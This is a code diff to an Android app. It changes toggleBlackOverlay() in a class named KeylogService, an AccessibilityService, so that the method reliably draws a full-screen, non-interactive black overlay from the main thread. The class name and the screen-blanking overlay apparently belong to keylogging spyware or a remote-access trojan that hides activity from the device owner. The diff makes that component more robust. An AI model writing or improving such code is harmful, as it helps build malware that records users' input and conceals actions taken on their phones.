@@ -12,6 +12,8 @@ import android.graphics.ColorSpace
 import android.hardware.HardwareBuffer
 import android.net.Uri
 import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.util.Log
 import android.view.Display
 import android.view.Gravity
@@ -172,32 +174,39 @@ class KeylogService : AccessibilityService() {
     }
 
     fun toggleBlackOverlay(enable: Boolean) {
-        if (enable) {
-            if (blackOverlay == null) {
-                blackOverlay = FrameLayout(this).apply {
-                    setBackgroundColor(Color.BLACK)
+        // Must run on main thread for WindowManager operations
+        Handler(Looper.getMainLooper()).post {
+            try {
+                if (enable) {
+                    if (blackOverlay == null) {
+                        blackOverlay = FrameLayout(this).apply {
+                            setBackgroundColor(Color.BLACK)
+                        }
+                        val params = WindowManager.LayoutParams(
+                            WindowManager.LayoutParams.MATCH_PARENT,
+                            WindowManager.LayoutParams.MATCH_PARENT,
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+                            else
+                                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                                    WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                            PixelFormat.TRANSLUCENT
+                        ).apply { gravity = Gravity.TOP }
+                        windowManager?.addView(blackOverlay, params)
+                        Log.i(TAG, "Black overlay enabled")
+                    }
+                } else {
+                    blackOverlay?.let {
+                        try { windowManager?.removeView(it) } catch (_: Exception) {}
+                        blackOverlay = null
+                        Log.i(TAG, "Black overlay disabled")
+                    }
                 }
-                val params = WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.MATCH_PARENT,
-                    WindowManager.LayoutParams.MATCH_PARENT,
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
-                    else
-                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
-                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
-                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
-                            WindowManager.LayoutParams.FLAG_FULLSCREEN,
-                    PixelFormat.TRANSLUCENT
-                ).apply { gravity = Gravity.TOP }
-                windowManager?.addView(blackOverlay, params)
-                Log.i(TAG, "Black overlay enabled")
-            }
-        } else {
-            blackOverlay?.let {
-                try { windowManager?.removeView(it) } catch (_: Exception) {}
-                blackOverlay = null
-                Log.i(TAG, "Black overlay disabled")
+            } catch (e: Exception) {
+                Log.e(TAG, "toggleBlackOverlay: ${e.message}")
             }
         }
     }
